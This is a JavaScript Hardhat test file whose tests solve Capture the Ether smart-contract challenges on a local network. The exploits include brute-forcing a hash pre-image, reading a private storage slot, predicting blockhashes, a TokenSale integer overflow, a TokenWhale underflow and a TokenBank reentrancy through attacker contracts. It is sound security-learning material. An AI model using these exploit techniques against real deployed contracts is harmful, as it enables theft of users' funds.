const {
  time,
  loadFixture,
  mine,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const { BigNumber } = ethers;

const hex =
  "0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365";

describe("Tests", function () {
  const container = (start = 0) => {
    let count = start;

    return (msg = undefined) => {
      console.log({ count: `${count}-${msg}` });
      count++;
    };
  };

  // We define a fixture to reuse the same setup in every test.
  // We use loadFixture to run this setup once, snapshot that state,
  // and reset Hardhat Network to that snapshot in every test.
  // async function deployOneYearLockFixture() {
  //   const ONE_YEAR_IN_SECS = 365 * 24 * 60 * 60;
  //   const ONE_GWEI = 1_000_000_000;

  //   const lockedAmount = ONE_GWEI;
  //   const unlockTime = (await time.latest()) + ONE_YEAR_IN_SECS;

  //   // Contracts are deployed using the first signer/account by default
  //   const [owner, otherAccount] = await ethers.getSigners();

  //   const Lock = await ethers.getContractFactory("Lock");
  //   const lock = await Lock.deploy(unlockTime, { value: lockedAmount });

  //   return { lock, unlockTime, lockedAmount, owner, otherAccount };
  // }

  // const oneEth = BigNumber.from("1_000_000_000_000_000_000");
  // const twoEth = BigNumber.from("2_000_000_000_000_000_000");

  describe("GuessNumber", function () {
    it("Should guess number to be 42", async function () {
      // const { lock, unlockTime } = await loadFixture(deployOneYearLockFixture);
      const GTN = await ethers.getContractFactory("GuessTheNumberChallenge");
      const gtn = await GTN.deploy({
        value: ethers.utils.parseEther("1"),
      });
      await gtn.deployed();

      await gtn.guess(42, { value: ethers.utils.parseEther("1") });
      expect(await gtn.isComplete()).to.equal(true);
    });
  });

  describe("GuessSecretNumber", function () {
    it("Should guess the secret number", async function () {
      const GTSN = await ethers.getContractFactory(
        "GuessTheSecretNumberChallenge"
      );
      const gtsn = await GTSN.deploy({
        value: ethers.utils.parseEther("1"),
      });
      await gtsn.deployed();
      let n = 0;
      let trigger = true;

      while (trigger) {
        n++;
        const hash = ethers.utils.keccak256(n);
        if (hash === hex) {
          trigger = false;
        }
      }
      console.log({ n });

      await gtsn.guess(n, { value: ethers.utils.parseEther("1") });
      expect(await gtsn.isComplete()).to.equal(true);
    });
  });

  describe("GuessRandomNumber", function () {
    it("Should get the number at storage 0", async function () {
      // const { lock, unlockTime } = await loadFixture(deployOneYearLockFixture);
      const GTRN = await ethers.getContractFactory(
        "GuessTheRandomNumberChallenge"
      );
      const gtrn = await GTRN.deploy({
        value: ethers.utils.parseEther("1"),
      });
      await gtrn.deployed();
      const n = BigNumber.from(
        await ethers.provider.getStorageAt(gtrn.address, 0)
      );
      console.log({ n });
      await gtrn.guess(n, { value: ethers.utils.parseEther("1") });
      expect(await gtrn.isComplete()).to.equal(true);
    });
  });

  describe("GuessNewNumber", () => {
    it("Guesses the newly generated number", async () => {
      const GTNN = await ethers.getContractFactory(
        "GuessTheNewNumberChallenge"
      );
      const ATTACK = await ethers.getContractFactory("GTNNAttack");
      const gtnn = await GTNN.deploy({
        value: ethers.utils.parseEther("1"),
      });

      const attack = await ATTACK.deploy();

      expect(await gtnn.isComplete()).to.equal(false);
      await attack.guess(gtnn.address, {
        value: ethers.utils.parseEther("1"),
        gasLimit: 50000,
      });

      expect(await gtnn.isComplete()).to.equal(true);
    });
  });

  describe("PredictTheFuture", () => {
    it("Predicts the number", async () => {
      const guessN = 0;
      const PTF = await ethers.getContractFactory("PredictTheFutureChallenge");
      const Attack = await ethers.getContractFactory("PTFAttack");

      const ptf = await PTF.deploy({ value: ethers.utils.parseEther("1") });
      const attack = await Attack.deploy(ptf.address);

      await attack.lockInGuess(guessN, {
        value: ethers.utils.parseEther("1"),
      });

      while (!(await ptf.isComplete())) {
        console.log("trigger1");

        await attack.guess(guessN, { gasLimit: 500000 });
        console.log("trigger");
      }

      expect(await ptf.isComplete()).to.equal(true);
    }).timeout(5000000000);
  });

  describe("PredictsTheBlockHash", () => {
    it("Predicts the hash", async () => {
      const zeroHash =
        "0x0000000000000000000000000000000000000000000000000000000000000000";
      const PTBH = await ethers.getContractFactory(
        "PredictTheBlockHashChallenge"
      );

      const ptbh = await PTBH.deploy({ value: ethers.utils.parseEther("1") });

      await ptbh.lockInGuess(zeroHash, {
        value: ethers.utils.parseEther("1"),
      });

      await mine(257, 1);

      await ptbh.settle();

      expect(await ptbh.isComplete()).to.equal(true);
    });
  });

  describe("TokenSale", () => {
    it("Gets more tokens than it should", async () => {
      /**
       * (2^256 - 1) / 10^18 + 1
       * =
       * result = 115792089237316195423570985008687907853269984665640564039458
       *
       * uint256(result) * 10^18 = 415992086870360064
       */
      const maxIntAnd1 = BigNumber.from(
        "115792089237316195423570985008687907853269984665640564039458"
      );

      const overflowed = BigNumber.from("415992086870360064");
      const TS = await ethers.getContractFactory("TokenSaleChallenge");

      const ts = await TS.deploy({ value: ethers.utils.parseEther("1") });

      await ts.buy(maxIntAnd1, { value: overflowed, gasLimit: 50000 });

      await ts.sell(1);

      expect(await ts.isComplete()).to.equal(true);
    });
  });

  describe("TokenWhale", () => {
    it("Tricks the contract to underflow", async () => {
      const [mainAcc, altAcc] = await ethers.getSigners();

      const TW = await ethers.getContractFactory("TokenWhaleChallenge");

      const tw = await TW.deploy(mainAcc.address);

      await tw.transfer(altAcc.address, 510);

      await tw.connect(altAcc).approve(mainAcc.address, 1000);

      await tw.transferFrom(altAcc.address, altAcc.address, 500);

      console.log(await tw.balanceOf(mainAcc.address));
      console.log(await tw.balanceOf(altAcc.address));

      expect(await tw.connect(altAcc).isComplete()).to.equal(true);
    });
  });

  //FIX TOKEN BANK AND PREDICT THE FUTURE

  describe("TokenBankChallenge", () => {
    it("Solves the challenge", async () => {
      const [_owner, attacker] = await ethers.getSigners();
      const challengeFactory = await ethers.getContractFactory(
        "TokenBankChallenge"
      );
      const bankContract = await challengeFactory.deploy(
        await attacker.getAddress()
      );
      await bankContract.deployed();

      const tokenAddress = await bankContract.token();
      const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
      const tokenContract = tokenFactory.attach(tokenAddress);

      const attackFactory = await ethers.getContractFactory(
        "TokenBankAttacker"
      );
      const attackContract = await attackFactory.deploy(
        bankContract.address,
        tokenContract.address
      );
      await attackContract.deployed();

      const tokens = BigNumber.from(10).pow(18).mul(500000);

      // Withdraw tokens: Bank -> Attacker EOA
      await bankContract.connect(attacker).withdraw(tokens);

      // Transfer tokens: Attacker EOA -> Attacker Contract
      await tokenContract
        .connect(attacker)
        ["transfer(address,uint256)"](attackContract.address, tokens);

      // Deposit tokens: Attacker Contract -> Bank
      await attackContract.connect(attacker).deposit();

      await attackContract.connect(attacker).withdraw();

      expect(await bankContract.isComplete()).to.be.true;
    });
  });
});
